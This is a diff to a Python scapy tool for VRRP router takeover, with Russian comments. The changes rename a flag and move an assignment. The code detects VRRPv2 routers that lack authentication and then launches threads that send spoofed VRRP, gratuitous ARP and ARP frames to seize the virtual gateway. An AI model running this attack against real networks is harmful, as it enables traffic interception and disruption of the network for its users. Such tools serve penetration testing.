@@ -1,3 +1,4 @@
+import sys
 import time
 from scapy.all import *
 from scapy.layers.vrrp import VRRP, VRRPv3
@@ -7,11 +8,11 @@ from colorama import *
 def vrrp_takeover(interface):
     try:
         print(Fore.YELLOW + f"    [!] Detecting VRRP routers...\n")  # Переведено
-        global VRRPv2_with_non_auth_captured
-        VRRPv2_with_non_auth_captured = False  # Не захвачен
+        global VRRPv2_without_auth_captured
+        VRRPv2_without_auth_captured = False  # Не захвачен
 
         def vrrp_adv_reply(packet):
-            global src_ip, virtual_mac, advert_interval, VRRPv2_with_non_auth_captured, virtual_rid, virtual_ip
+            global src_ip, virtual_mac, advert_interval, VRRPv2_without_auth_captured, virtual_rid, virtual_ip
             if packet.haslayer(VRRPv3):  # Если это VRRPv3
                 virtual_mac = packet[Ether].src
                 src_ip = packet[IP].src
@@ -38,12 +39,14 @@ def vrrp_takeover(interface):
                 version = packet[VRRP].version
                 virtual_rid = packet[VRRP].vrid
                 virtual_ip = packet[VRRP].addrlist
+                advert_interval = packet[VRRP].adv
+
                 priority = packet[VRRP].priority
                 if priority == 255:
                     output_priority = f"{Fore.RED}255 (max){Fore.GREEN}"
                 else:
                     output_priority = priority
-                advert_interval = packet[VRRP].adv
+
                 auth = packet[VRRP].authtype
                 if auth == 1:
                     output_auth = f"{Fore.RED}Plain Text (Temporarily unsupported){Fore.GREEN}"
@@ -53,7 +56,7 @@ def vrrp_takeover(interface):
                     output_auth = "None"
 
                 if priority < 255 and auth == 0:
-                    VRRPv2_with_non_auth_captured = True
+                    VRRPv2_without_auth_captured = True
 
                 print(Fore.GREEN + f"    [+] [VRRP Router detected]\n         MAC: {virtual_mac.upper()}\n         IP: {src_ip}\n         Version: {version}\n"
                                  f"         Virtual Router ID: {virtual_rid}\n         Priority: {output_priority}\n         Advertisement Interval: {advert_interval} (sec)\n         Auth: {output_auth}\n"
@@ -105,7 +108,7 @@ def vrrp_takeover(interface):
             sniffer = AsyncSniffer(filter="arp", iface=interface, prn=packet_analyze)
             sniffer.start()
 
-        if VRRPv2_with_non_auth_captured == True:
+        if VRRPv2_without_auth_captured == True:
             Thread(target=send_vrrp_packets, daemon=False).start()
             Thread(target=send_garp_frames, daemon=False).start()
             Thread(target=send_arp_frames, daemon=False).start()
